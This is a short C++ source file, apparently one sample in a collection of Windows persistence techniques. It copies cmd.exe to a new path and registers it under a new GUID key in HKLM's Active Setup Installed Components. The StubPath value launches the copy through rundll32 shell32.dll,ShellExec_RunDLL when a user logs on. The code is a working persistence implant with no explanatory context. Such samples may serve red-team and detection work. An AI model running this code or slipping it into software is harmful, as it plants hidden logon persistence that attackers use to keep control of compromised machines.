#include <windows.h>
#include <string>

#include "..\..\utils.h"

using namespace std;

HKEY RootKey = HKEY_LOCAL_MACHINE;
LPCSTR SubKey = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\";

string ExeName = "Cmd.exe";
string ExePath = string(getenv("WINDIR")) + "\\System32\\" + ExeName;

int main(){

    string binaryPath = newBinary(ExePath);
    string value = "rundll32.exe shell32.dll,ShellExec_RunDLL " + binaryPath;
    string guid = newGuid();

    char completeKey[strlen(SubKey) + 39];
    strcpy(completeKey, SubKey);
    strcat(completeKey, guid.c_str());

    set_registry_value(RootKey, (const char *)completeKey, "StubPath", &value, NULL);

    return 0;
}